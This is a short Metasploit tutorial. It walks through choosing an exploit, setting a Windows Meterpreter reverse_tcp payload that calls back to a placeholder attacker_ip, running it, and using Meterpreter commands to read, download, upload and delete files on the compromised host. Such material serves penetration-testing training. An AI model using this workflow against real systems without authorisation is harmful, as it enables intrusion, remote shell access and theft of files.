# Metasploit and Basic Steps

## Starting Metasploit

To start Metasploit, open a terminal and run:

```bash
msfconsole
```

If you encounter a database error, you might need to enable the PostgreSQL service:

```bash
service postgresql start 
service metasploit start
msfconsole
```

## Basic Steps

1. **Picking an Exploit**

   To list all available exploits:

   ```bash
   msf> show exploits
   ```

   You can use the `search` command to find exploits more quickly:

   ```bash
   msf> help search
   ```

   Select an exploit using:

   ```bash
   msf> use "name of exploit"
   msf> info "name of exploit"
   ```

2. **Setting Exploit Options**

   Choose the right exploit and configure its options:

   ```bash
   msf> set RHOSTS target_ip
   msf> set RPORT target_port
   ```

3. **Picking a Payload**

   List available payloads:

   ```bash
   msf> show payloads
   ```

   Select a payload, e.g., `reverse_tcp`:

   ```bash
   msf> set payload windows/meterpreter/reverse_tcp
   ```

4. **Setting Payload Options**

   Display payload options:

   ```bash
   msf> show options
   ```

   Set payload options (e.g., `LHOST`):

   ```bash
   msf> set LHOST attacker_ip
   ```

5. **Running the Exploit**

   Run the exploit:

   ```bash
   msf> exploit
   ```

6. **Connecting to the Remote System**

   List available sessions:

   ```bash
   msf> sessions
   ```

   Connect to a session:

   ```bash
   msf> sessions -i session_id
   ```

   Switch to the Meterpreter prompt:

   ```bash
   meterpreter>
   ```

7. **Performing Post Exploitation Process**

   Use various Meterpreter commands for post-exploitation tasks.

# Meterpreter Shell

Meterpreter is a powerful shell for post-exploitation tasks.

## Basic Meterpreter Commands

### Core Commands

```bash
meterpreter> background  # Background the session
meterpreter> sessions -i session_id  # Return to a backgrounded session
meterpreter> load module_name  # Load additional modules
meterpreter> run module_name  # Run loaded module
meterpreter> exit  # Exit Meterpreter
```

### File System Commands

```bash
meterpreter> cat file_path  # Read file contents
meterpreter> cd directory_path  # Change directory
meterpreter> download remote_file local_path  # Download a file
meterpreter> upload local_file remote_path  # Upload a file
meterpreter> ls  # List files
meterpreter> pwd  # Print working directory
meterpreter> mkdir directory_name  # Create a directory
meterpreter> rm file_path  # Remove a file
meterpreter> rmdir directory_path  # Remove a directory
```
